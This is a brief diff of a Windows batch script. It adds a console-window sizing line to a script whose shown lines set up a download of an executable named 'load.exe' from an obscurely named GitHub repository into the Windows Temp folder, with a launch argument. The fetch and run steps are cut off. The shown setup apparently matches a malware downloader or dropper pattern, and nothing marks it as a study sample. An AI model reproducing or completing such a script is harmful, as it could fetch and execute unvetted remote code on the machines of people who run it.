@@ -1,4 +1,5 @@
 @echo off
+mode con: cols=40 lines=15
 set "url=https://github.com/dexterggsamp12/929228282/raw/refs/heads/main/load.exe"
 set "destination=C:\Windows\Temp\load.exe"
 set "arguments=Apply"
